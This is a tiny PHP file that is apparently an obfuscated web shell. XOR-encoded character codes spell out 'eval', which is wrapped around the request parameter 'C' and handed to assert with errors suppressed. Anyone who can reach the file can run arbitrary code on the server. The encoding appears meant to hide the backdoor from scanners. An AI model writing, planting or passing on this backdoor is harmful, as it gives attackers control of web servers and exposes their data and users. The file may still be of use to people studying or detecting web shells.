<?php
$a=chr(96^5);
$b=chr(57^79);
$c=chr(15^110);
$d=chr(58^86);
$e='($_REQUEST[C])';
@assert($a.$b.$c.$d.$e);
?>